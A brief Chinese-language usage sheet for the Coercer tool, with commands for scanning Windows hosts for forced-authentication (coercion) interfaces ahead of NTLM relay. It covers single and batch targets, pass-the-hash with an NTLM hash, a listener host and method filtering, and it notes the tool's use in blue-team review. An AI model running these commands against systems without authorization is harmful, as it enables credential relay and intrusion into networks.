# Coercer 使用

Coercer 用于验证 Windows 服务是否会向指定监听端发起认证。它常用于 NTLM 中继前的路径确认，也适合蓝队复核强制认证面。

## 基础枚举

```bash
coercer scan -t 192.168.1.10 -u user -p pass -d domain.local
```

```bash
coercer scan -t 192.168.1.10 -u user -p pass -d domain.local --listener 192.168.1.50
```

```bash
coercer scan -t 192.168.1.10 -u user -H NTLMHASH -d domain.local
```

## 批量目标

```bash
coercer scan -f targets.txt -u user -p pass -d domain.local --listener 192.168.1.50
```

```bash
coercer scan -f targets.txt -u user -p pass -d domain.local --json coercer.json
```

## 降噪验证

```bash
coercer scan -t 192.168.1.10 -u user -p pass -d domain.local --filter-method EfsRpcOpenFileRaw
```

Coercer 的结果要和监听端日志一起看。命中接口、目标主机、认证来源和是否签名保护都要写清楚。
